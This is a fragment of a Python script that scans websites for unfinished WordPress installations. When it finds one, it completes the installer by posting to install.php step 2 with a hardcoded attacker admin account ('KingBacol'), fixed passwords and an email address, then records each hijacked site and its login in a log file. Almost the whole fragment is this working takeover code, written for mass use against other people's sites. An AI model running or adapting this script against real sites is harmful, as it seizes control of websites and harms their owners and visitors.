...
def check(site):
  try:
    ...
    if 'admin_password2' in install.text or 'weblog_title' in install.text:
      ...
      requests.post(site +"/wp-admin/install.php?step=2", data = {'weblog_title':'KingBacol','user_name':'KingBacol','admin_password':'KingBacol212','admin_password2':'KingBacol212','admin_email':'tempikberlubang@hotmail.com','language':'','Submit':'Install+WordPress'}, timeout=25)
      op = urllib2.urlopen(site +"wp-login.php", timeout=25)
      if "KingBacol" in op.read():
        print("{}[+] {}"+ site +" |{} INSTALL OK{}").format(fg, fw, fc, fc)
        open("logswp.txt","a").write(site+"/wp-login.php#KingBacol@KingBacol123!@#\n")
      else:
      ...
      requests.post(site +"/wp-admin/install.php?step=2", data = {'weblog_title':'KingBacol','user_name':'KingBacol','admin_password':'KingBacol123!@#','admin_password2':'KingBacol123!@#','admin_email':'tempikberlubang@hotmail.com','language':'','Submit':'Install+WordPress'}, timeout=25)
      op = urllib2.urlopen(site +"/wp-login.php", timeout=25)
      if "KingBacol" in op.read():
        print("{}[+] {}"+ site +" |{} INSTALL OK{}").format(fg, fw, fc, fc)
        open("logswp.txt","a").write(site+"/wp-login.php#KingBacol@KingBacol123!@#\n")
